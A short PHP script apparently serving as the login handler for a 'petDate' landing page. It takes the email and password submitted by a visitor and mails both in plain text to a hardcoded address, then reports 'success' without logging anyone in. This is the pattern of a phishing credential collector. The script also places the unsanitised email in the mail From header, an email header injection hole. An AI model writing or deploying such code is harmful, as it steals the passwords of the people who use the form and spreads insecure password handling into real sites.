<?php
$errorMSG = "";

if (empty($_POST["email"])) {
    $errorMSG = "El correo es requerido ";
} else {
    $email = $_POST["email"];
}

if (empty($_POST["password"])) {
    $errorMSG = "La contraseña es requerida ";
} else {
    $password = $_POST["password"];
}

$EmailTo = "yourname@domain.com";
$Subject = "New log in from petDate landing page";

// prepare email body text
$Body = "";
$Body .= "Email: ";
$Body .= $email;
$Body .= "\n";
$Body .= "Password: ";
$Body .= $password;
$Body .= "\n";

// send email
$success = mail($EmailTo, $Subject, $Body, "From:".$email);
// redirect to success page
if ($success && $errorMSG == ""){
   echo "success";
}else{
    if($errorMSG == ""){
        echo "Algo fallo:(";
    } else {
        echo $errorMSG;
    }
}
?>